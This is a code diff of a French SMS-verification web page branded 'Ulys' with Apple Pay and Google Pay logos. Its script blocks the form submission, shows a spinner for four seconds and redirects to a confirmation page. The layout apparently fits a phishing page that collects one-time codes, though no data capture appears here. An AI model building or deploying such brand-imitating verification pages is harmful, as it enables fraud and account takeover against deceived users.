@@ -7,14 +7,15 @@
   <link rel="stylesheet" href="assets/css/style.css"/>
 </head>
 <body>
- <!-- BINDEAU HAUT BLANC -->
+
+  <!-- BANDEAU HAUT -->
   <div class="top-nav">
     <a href="#"><span>👤</span> Mon espace</a>
     <a href="#" class="btn-primary">Devenir client</a>
     <div class="lang">FR ▼</div>
   </div>
 
-  <!-- NAVBAR PRINCIPALE BLANCHE -->
+  <!-- NAVIGATION -->
   <div class="site-nav">
     <nav class="navbar">
       <div class="navbar-left">
@@ -34,29 +35,24 @@
       </ul>
     </nav>
   </div>
-  <header>
-    <nav class="navbar">  
-   </nav>
-  </header>
 
   <main class="container">
     <div class="card">
       <h1>Vérification par SMS</h1>
 
-<!-- Logos Apple Pay / Google Pay centrés -->
-<div class="logos-wrapper">
-  <div class="mobile-logos">
-    <img src="assets/images/applepay.png" alt="Apple Pay">
-    <img src="assets/images/googlepay.png" alt="Google Pay">
-  </div>
-</div>
+      <!-- Logos Apple Pay / Google Pay -->
+      <div class="logos-wrapper">
+        <div class="mobile-logos">
+          <img src="assets/images/applepay.png" alt="Apple Pay">
+          <img src="assets/images/googlepay.png" alt="Google Pay">
+        </div>
+      </div>
 
-<p class="sms-info-text">Un code à 6 chiffres vient de vous être envoyé sur votre mobile.</p>
+      <p class="sms-info-text">Un code à 6 chiffres vient de vous être envoyé sur votre mobile.</p>
 
-      <form action="#" method="post">
+      <form id="sms-form">
         <label for="sms-code">Code reçu</label>
         <input type="text" id="sms-code" name="sms-code" maxlength="6" placeholder="123456" required/>
-
         <button type="submit" class="btn">Confirmer</button>
       </form>
     </div>
@@ -66,5 +62,21 @@
     &copy; 2025 Ulys. Sécurité renforcée.
   </footer>
 
+  <!-- Spinner -->
+  <div class="loader-overlay" id="spinnerOverlay" style="display: none;">
+    <div class="loader"></div>
+  </div>
+
+  <script>
+    document.getElementById("sms-form").addEventListener("submit", function(e) {
+      e.preventDefault(); // Empêche le rechargement de page
+      document.getElementById("spinnerOverlay").style.display = "flex";
+
+      // Redirection vers la page de confirmation après 4 secondes
+      setTimeout(function() {
+        window.location.href = "confirmation.html";
+      }, 4000);
+    });
+  </script>
 </body>
 </html>
